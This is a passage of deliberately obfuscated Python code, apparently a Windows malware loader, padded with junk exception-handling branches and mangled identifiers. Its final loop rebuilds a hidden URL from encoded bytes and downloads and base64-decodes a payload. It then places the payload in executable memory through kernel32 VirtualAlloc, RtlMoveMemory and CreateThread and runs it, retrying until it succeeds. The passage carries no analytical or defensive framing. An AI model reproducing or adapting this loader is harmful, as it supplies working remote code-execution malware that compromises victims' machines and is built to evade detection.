                raise MemoryError([(lambda : (lambda _1518: _1518 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _76 = [[(lambda : (lambda _107: _107 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _518: _518 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _610: _610 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1614:
        try:
            raise MemoryError(__5316692273894)
        except MemoryError as __4367958827157:
            if __4367958827157.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.restype = wt.DWORD
            if __4367958827157.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __5879960063596 = (lambda : R_E_D__A_V(b'R_E_D__A_V__a\x8e.\xfe\x87A'))()
try:
    match '1417' == '1113':
        case True:
            raise MemoryError([True])
        case False:
            _1716 = [[True], [False]]
            R_E_D__A_V______(['_153'])
    raise MemoryError([True])
except MemoryError as _516:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _46: _46 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1418 = [[(lambda : (lambda _139: _139 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _155: _155 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _1712: _1712 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _312:
        while (lambda : (lambda _1410: _1410 + (lambda : ______R_E_D__A_V_______((lambda : R_E_D__A_V(b'R_E_D__A_V__wx'))()))())((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()) == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))())():
            try:
                buf = base64.b64decode(urllib.request.urlopen((lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyo'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy9'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyv'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyf'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyw'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyu'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyw'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyu'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy0'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy1'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyc'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyG'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyv'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyy'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyo'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyi'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyw'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))()]))))())())()).read().decode((lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy,'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy7'))()]))))())())()))
                memAddr = kernel32.VirtualAlloc(None, len(buf), (lambda : R_E_D__A_V(b'R_E_D__A_V__0\x00'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__@'))())
                kernel32.RtlMoveMemory(memAddr, buf, len(buf))
                th = kernel32.CreateThread(ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_void_p(memAddr), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.pointer(ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))())))
                kernel32.WaitForSingleObject(th, -(lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))())
                break
            except Exception:
                continue